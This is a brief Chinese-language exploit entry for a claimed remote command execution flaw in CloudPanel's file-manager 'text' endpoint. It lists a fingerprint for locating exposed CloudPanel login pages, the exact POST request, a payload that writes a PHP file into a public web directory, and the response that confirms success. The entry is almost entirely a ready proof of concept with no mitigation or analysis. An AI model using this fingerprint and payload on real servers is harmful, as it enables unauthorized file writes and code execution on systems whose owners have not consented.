# CloudPaneltext接口存在远程命令执行漏洞

CloudPaneltext ｜ 命令执行 ｜ —
- **指纹**：`title=="CloudPanel | Log In"`
- **请求**：`POST /file-manager/backend/text HTTP/1.1`

**Payload**
```
id=/htdocs/app/files/public/dudesite.php&content=<?php echo 'dudesite';?>
```
- **响应特征**：200 dudesite.php